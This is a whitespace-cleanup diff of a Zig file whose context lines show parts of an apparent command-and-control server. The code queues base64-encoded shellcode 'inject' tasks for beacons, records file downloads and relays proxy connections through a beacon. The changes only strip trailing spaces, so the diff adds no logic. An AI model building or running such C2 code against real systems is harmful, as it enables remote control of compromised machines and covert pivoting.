@@ -152,7 +152,7 @@ pub const Server = struct {
                 const id = iter.next() orelse continue;
                 const path = iter.rest();
                 if (path.len == 0) continue;
-                
+
                 const sc = std.fs.cwd().readFileAlloc(self.allocator, path, 10 * 1024 * 1024) catch |err| {
                     std.debug.print("Error reading shellcode file: {}\n", .{err});
                     continue;
@@ -387,7 +387,7 @@ pub const Server = struct {
                 t.result = try std.fmt.allocPrint(self.allocator, "Downloaded to {s}", .{local_name});
             }
         } else {
-            std.debug.print("[-] File download failed for task {d}\n", .{ task_id });
+            std.debug.print("[-] File download failed for task {d}\n", .{task_id});
             if (task_ptr) |t| {
                 t.status = .failed;
                 t.result = try self.allocator.dupe(u8, data_b64);
@@ -470,13 +470,13 @@ pub const Server = struct {
         const b64_len = encoder.calcSize(shellcode.len);
         const b64_data = try self.allocator.alloc(u8, b64_len);
         _ = encoder.encode(b64_data, shellcode);
-        
+
         const id = @as(u64, @intCast(self.tasks.items.len + 1));
         try self.tasks.append(self.allocator, .{
             .id = id,
             .type = .inject,
             .beacon_id = try self.allocator.dupe(u8, beacon_id),
-            .command = b64_data, 
+            .command = b64_data,
             .status = .queued,
         });
         return id;
@@ -518,11 +518,11 @@ pub const Server = struct {
             self.mutex.unlock();
             return;
         };
-        
+
         var beacon_id: []const u8 = "";
         var iter = self.beacons.keyIterator();
         if (iter.next()) |k| {
-            beacon_id = self.allocator.dupe(u8, k.*) catch ""; 
+            beacon_id = self.allocator.dupe(u8, k.*) catch "";
         }
         self.mutex.unlock();
 
@@ -535,7 +535,7 @@ pub const Server = struct {
         var host_buf: [256]u8 = undefined;
         // addr is std.net.Address. format is 1.2.3.4:80
         const host_str = std.fmt.bufPrint(&host_buf, "{f}", .{req.addr}) catch return;
-        
+
         self.queueProxyConnect(beacon_id, id, host_str) catch return;
 
         var buf: [4096]u8 = undefined;
@@ -554,7 +554,7 @@ pub const Server = struct {
     pub fn queueProxyConnect(self: *Server, beacon_id: []const u8, id: u32, target: []const u8) !void {
         const payload = .{ .subtype = "connect", .id = id, .target = target };
         const cmd = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
-        
+
         self.mutex.lock();
         defer self.mutex.unlock();
         const tid = @as(u64, @intCast(self.tasks.items.len + 1));
@@ -572,9 +572,9 @@ pub const Server = struct {
         const b64_len = encoder.calcSize(data.len);
         const b64 = try self.allocator.alloc(u8, b64_len);
         _ = encoder.encode(b64, data);
-        // command takes ownership of b64 string if we format it right? 
+        // command takes ownership of b64 string if we format it right?
         // No, json fmt prints it. We need to free b64.
-        
+
         const payload = .{ .subtype = "write", .id = id, .data = b64 };
         const cmd = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
         self.allocator.free(b64);
@@ -591,4 +591,3 @@ pub const Server = struct {
         });
     }
 };
- 
